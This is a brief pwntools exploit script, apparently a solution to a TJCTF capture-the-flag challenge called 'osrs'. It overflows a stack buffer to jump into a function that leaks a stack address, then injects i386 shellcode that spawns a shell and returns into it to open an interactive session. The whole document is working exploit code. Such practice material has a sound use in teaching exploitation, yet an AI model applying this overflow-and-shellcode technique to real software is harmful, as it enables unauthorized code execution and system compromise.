from pwn import *
get_tree = ELF('./osrs').symbols['get_tree']
r_offset = 0x10C+4
r = process('./osrs')
#r = remote('p1.tjctf.org', 8006)
r.sendlineafter(': \n', r_offset*'A' + p32(get_tree))
r.recvuntil('tree ')
s_addr = (1<<32)+int(r.recvuntil(' '))
sh = asm(shellcraft.i386.linux.sh(), arch='i386')
r.sendlineafter(': \n', sh.ljust(r_offset) + p32(s_addr+4))
r.interactive()

